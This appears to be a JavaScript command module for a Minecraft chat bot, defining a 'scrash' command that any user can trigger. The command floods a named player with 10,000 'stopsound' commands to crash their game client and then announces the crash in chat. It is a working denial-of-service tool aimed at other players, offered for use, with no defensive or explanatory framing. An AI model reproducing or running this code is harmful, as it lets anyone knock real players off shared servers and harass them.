module.exports = {
  chat (handler) {
    const player = handler.args.join(' ')

    handler.tellraw(`${player} was crashed by ${handler.bot.username} using scrash`)
    for (let i = 0; i < 10000; i++) handler.core.run(`stopsound ${handler.util.selectUsername(player)}`)
  },
  name: 'scrash',
  description: 'Crashes a client.',
  usage: 'scrash <player>',
  trust: 0,
  enabled: true
}
